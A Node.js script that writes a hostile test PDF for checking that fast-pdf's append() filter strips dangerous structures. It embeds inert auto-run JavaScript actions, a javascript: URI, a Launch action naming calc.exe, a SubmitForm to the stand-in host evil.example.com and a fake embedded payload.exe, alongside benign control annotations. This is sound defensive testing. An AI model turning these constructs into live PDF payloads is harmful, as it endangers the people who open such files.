/**
 * Builds a deliberately hostile PDF for testing fast-pdf's append() filter.
 *
 * Everything in here is a construct a PDF viewer might act on — auto-running
 * JavaScript, launch and submit actions, an embedded executable, form fields.
 * None of it is exploit code: the payloads are inert strings (`app.alert`, a
 * text file named payload.exe). The point is that append() must drop the
 * *structures*, which it does by whitelist.
 *
 * Three benign markup annotations are included as controls — a filter that
 * drops those too would be useless, so they must survive.
 *
 * Writes examples/output/hostile.pdf (gitignored, never published).
 */
import { writeFileSync, mkdirSync } from "node:fs";

const ORDER = [
  "catalog", "pages", "page1", "page2", "content1", "content2", "resources", "font",
  // payloads
  "openAction", "jsNameTree", "jsNameAction", "pageOpenAction",
  "aJS", "aMouseoverJS", "aUriJS", "aLaunch", "aSubmit", "aGoToR", "aNamedDest",
  "aGoToPage2", "aFileAttach", "efSpec", "efStream", "aWidget", "aScreen", "aRichMedia",
  // controls that must survive
  "okLink", "okSquare", "okHighlight", "okSquareAP",
];
const N = Object.fromEntries(ORDER.map((name, i) => [name, i + 1]));
const R = (name) => `${N[name]} 0 R`;

const LINES = [
  ["HOSTILE TEST PDF", 20, true],
  ["Fuer den append()-Filter von fast-pdf. Alle Payloads sind inert.", 10.5, false],
  ["", 6, false],
  ["Diese 15 Konstrukte MUESSEN beim Anhaengen verschwinden:", 11.5, true],
  ["  1  /OpenAction            JavaScript beim Oeffnen des Dokuments", 10, false],
  ["  2  /Names /JavaScript     Auto-Run-Skript im Namensbaum des Katalogs", 10, false],
  ["  3  Seiten-/AA /O          JavaScript beim Aufschlagen der Seite", 10, false],
  ["  4  Link /A /S /JavaScript app.alert beim Klick", 10, false],
  ["  5  Link /AA /E            JavaScript bei Mouseover", 10, false],
  ["  6  Link /A /S /URI        javascript:alert(1)", 10, false],
  ["  7  Link /A /S /Launch     startet calc.exe", 10, false],
  ["  8  Link /A /S /SubmitForm sendet an evil.example.com", 10, false],
  ["  9  Link /A /S /GoToR      oeffnet eine fremde Datei", 10, false],
  [" 10  Link /Dest             benannte Destination (Namensbaum fehlt danach)", 10, false],
  [" 11  Link /A /S /GoTo       Sprung auf Seite 2", 10, false],
  [" 12  /FileAttachment        eingebettete payload.exe", 10, false],
  [" 13  /Widget                AcroForm-Textfeld", 10, false],
  [" 14  /Screen                Rendition-Action", 10, false],
  [" 15  /RichMedia             eingebettetes Medienobjekt", 10, false],
  ["", 8, false],
  ["Diese drei MUESSEN erhalten bleiben (Kontrollgruppe):", 11.5, true],
  ["  A  Link auf https://example.com/ok", 10, false],
  ["  B  /Square-Markup mit rotem Rahmen (unten auf der Seite)", 10, false],
  ["  C  /Highlight-Markup mit /QuadPoints", 10, false],
  ["", 8, false],
  ["Erwartung: die Seite sieht danach genau so aus wie jetzt.", 10, false],
  ["Nur die Struktur drumherum wird gefiltert.", 10, false],
];

function contentStream() {
  const parts = ["BT"];
  let y = 800;
  for (const [text, size, bold] of LINES) {
    if (text !== "") {
      parts.push(`/${bold ? "F2" : "F1"} ${size} Tf 1 0 0 1 48 ${y.toFixed(1)} Tm (${text.replace(/([()\\])/g, "\\$1")}) Tj`);
    }
    y -= size * 1.55;
  }
  parts.push("ET");
  // The frame the /Square control annotation sits on, drawn as real content so
  // the page still shows something even where a viewer ignores annotations.
  parts.push("0.7 0.1 0.1 RG 1 w 48 92 300 40 re S");
  parts.push("BT /F1 9 Tf 1 0 0 1 56 108 Tm (Kontrolle B: hier liegt die /Square-Annotation) Tj ET");
  return parts.join("\n");
}

const BODIES = {
  catalog:
    `<< /Type /Catalog /Pages ${R("pages")} ` +
    `/OpenAction ${R("openAction")} ` +
    `/Names << /JavaScript ${R("jsNameTree")} >> ` +
    `/AcroForm << /Fields [${R("aWidget")}] /SigFlags 0 >> ` +
    `/Dests << /secret [${R("page2")} /Fit] >> >>`,
  pages: `<< /Type /Pages /Kids [${R("page1")} ${R("page2")}] /Count 2 >>`,
  page1:
    `<< /Type /Page /Parent ${R("pages")} /MediaBox [0 0 595 842] ` +
    `/Contents ${R("content1")} /Resources ${R("resources")} ` +
    `/AA << /O ${R("pageOpenAction")} >> ` +
    `/Annots [${["aJS", "aMouseoverJS", "aUriJS", "aLaunch", "aSubmit", "aGoToR",
                 "aNamedDest", "aGoToPage2", "aFileAttach", "aWidget", "aScreen",
                 "aRichMedia", "okLink", "okSquare", "okHighlight"].map(R).join(" ")}] >>`,
  page2:
    `<< /Type /Page /Parent ${R("pages")} /MediaBox [0 0 595 842] ` +
    `/Contents ${R("content2")} /Resources ${R("resources")} >>`,
  content1: { stream: contentStream() },
  content2: {
    stream:
      "BT /F2 16 Tf 1 0 0 1 48 780 Tm (Seite 2 - Sprungziel) Tj ET\n" +
      "BT /F1 10.5 Tf 1 0 0 1 48 752 Tm (Wird nur mit pages: [1] weggelassen. Dann muss der /GoTo-Link von) Tj ET\n" +
      "BT /F1 10.5 Tf 1 0 0 1 48 736 Tm (Seite 1 verschwinden, weil sein Ziel nicht mitkommt.) Tj ET",
  },
  resources: `<< /Font << /F1 ${R("font")} /F2 ${R("font")} >> >>`,
  font: "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>",

  // ── Payloads ────────────────────────────────────────────────────────
  openAction: "<< /S /JavaScript /JS (app.alert\\('FASTPDF_LEAK openAction'\\);) >>",
  jsNameTree: `<< /Names [(evilScript) ${R("jsNameAction")}] >>`,
  jsNameAction: "<< /S /JavaScript /JS (app.alert\\('FASTPDF_LEAK nameTree'\\);) >>",
  pageOpenAction: "<< /S /JavaScript /JS (app.alert\\('FASTPDF_LEAK pageOpen'\\);) >>",

  aJS:
    "<< /Type /Annot /Subtype /Link /Rect [48 690 300 704] /Border [0 0 0] " +
    "/A << /S /JavaScript /JS (app.alert\\('FASTPDF_LEAK linkAction'\\);) >> >>",
  aMouseoverJS:
    "<< /Type /Annot /Subtype /Link /Rect [48 674 300 688] /Border [0 0 0] " +
    "/AA << /E << /S /JavaScript /JS (app.alert\\('FASTPDF_LEAK mouseover'\\);) >> >> >>",
  aUriJS:
    "<< /Type /Annot /Subtype /Link /Rect [48 658 300 672] /Border [0 0 0] " +
    "/A << /S /URI /URI (javascript:alert\\('FASTPDF_LEAK uriScheme'\\)) >> >>",
  aLaunch:
    "<< /Type /Annot /Subtype /Link /Rect [48 642 300 656] /Border [0 0 0] " +
    "/A << /S /Launch /F (FASTPDF_LEAK_calc.exe) /NewWindow true >> >>",
  aSubmit:
    "<< /Type /Annot /Subtype /Link /Rect [48 626 300 640] /Border [0 0 0] " +
    "/A << /S /SubmitForm /F << /FS /URL /F (https://evil.example.com/FASTPDF_LEAK_collect) >> /Flags 4 >> >>",
  aGoToR:
    "<< /Type /Annot /Subtype /Link /Rect [48 610 300 624] /Border [0 0 0] " +
    "/A << /S /GoToR /F (FASTPDF_LEAK_other.pdf) /D [0 /Fit] >> >>",
  aNamedDest:
    "<< /Type /Annot /Subtype /Link /Rect [48 594 300 608] /Border [0 0 0] /Dest (secret) >>",
  aGoToPage2:
    `<< /Type /Annot /Subtype /Link /Rect [48 578 300 592] /Border [0 0 0] ` +
    `/A << /S /GoTo /D [${R("page2")} /Fit] >> >>`,
  aFileAttach:
    `<< /Type /Annot /Subtype /FileAttachment /Rect [48 562 68 578] /Name /Paperclip ` +
    `/Contents (Anhang) /FS ${R("efSpec")} >>`,
  efSpec: `<< /Type /Filespec /F (FASTPDF_LEAK_payload.exe) /UF (FASTPDF_LEAK_payload.exe) /EF << /F ${R("efStream")} >> >>`,
  efStream: { stream: "MZ FASTPDF_LEAK this pretends to be an executable payload", extra: "/Type /EmbeddedFile /Subtype /application#2Foctet-stream" },
  aWidget:
    "<< /Type /Annot /Subtype /Widget /FT /Tx /T (FASTPDF_LEAK_field) /V (geheim) " +
    "/Rect [48 540 300 558] /F 4 /DA (/Helv 10 Tf 0 g) >>",
  aScreen:
    "<< /Type /Annot /Subtype /Screen /Rect [320 540 420 578] /T (FASTPDF_LEAK_screen) " +
    "/A << /S /Rendition /OP 0 /R << /S /MR /C << /S /MCD /D << /F (FASTPDF_LEAK_clip.mp4) >> >> >> >> >>",
  aRichMedia:
    "<< /Type /Annot /Subtype /RichMedia /Rect [430 540 530 578] " +
    "/RichMediaSettings << /Activation << /Condition /PO >> >> /Contents (FASTPDF_LEAK_richmedia) >>",

  // ── Controls: these have to come through ────────────────────────────
  okLink:
    "<< /Type /Annot /Subtype /Link /Rect [48 316 300 330] /Border [0 0 0] " +
    "/A << /S /URI /URI (https://example.com/ok) >> >>",
  okSquare:
    `<< /Type /Annot /Subtype /Square /Rect [48 92 348 132] /C [0.7 0.1 0.1] ` +
    `/CA 1 /Contents (Kontrolle B) /AP << /N ${R("okSquareAP")} >> >>`,
  okSquareAP: {
    stream: "0.7 0.1 0.1 RG 1 w 0.5 0.5 299 39 re S",
    extra: "/Type /XObject /Subtype /Form /BBox [0 0 300 40]",
  },
  okHighlight:
    "<< /Type /Annot /Subtype /Highlight /Rect [48 284 300 300] /C [1 0.9 0.2] " +
    "/QuadPoints [48 300 300 300 48 284 300 284] /Contents (Kontrolle C) >>",
};

// ── Assemble the file ────────────────────────────────────────────────
const chunks = [];
let offset = 0;
const push = (text) => {
  const bytes = Buffer.from(text, "latin1");
  chunks.push(bytes);
  offset += bytes.length;
};

push("%PDF-1.7\n%\xe2\xe3\xcf\xd3\n");
const offsets = [0];
for (const name of ORDER) {
  const body = BODIES[name];
  if (body === undefined) throw new Error(`no body for ${name}`);
  offsets[N[name]] = offset;
  if (typeof body === "string") {
    push(`${N[name]} 0 obj\n${body}\nendobj\n`);
  } else {
    const data = body.stream;
    push(`${N[name]} 0 obj\n<< ${body.extra ?? ""} /Length ${Buffer.byteLength(data, "latin1")} >>\nstream\n${data}\nendstream\nendobj\n`);
  }
}

const xrefAt = offset;
let xref = `xref\n0 ${ORDER.length + 1}\n0000000000 65535 f \n`;
for (let i = 1; i <= ORDER.length; i++) {
  xref += `${String(offsets[i]).padStart(10, "0")} 00000 n \n`;
}
xref += `trailer\n<< /Size ${ORDER.length + 1} /Root ${R("catalog")} >>\nstartxref\n${xrefAt}\n%%EOF\n`;
push(xref);

mkdirSync("examples/output", { recursive: true });
const out = Buffer.concat(chunks);
writeFileSync("examples/output/hostile.pdf", out);
console.log(`examples/output/hostile.pdf — ${out.length} Bytes, ${ORDER.length} Objekte, 2 Seiten`);
console.log(`Payload-Marker im Original: ${(out.toString("latin1").match(/FASTPDF_LEAK/g) ?? []).length}`);
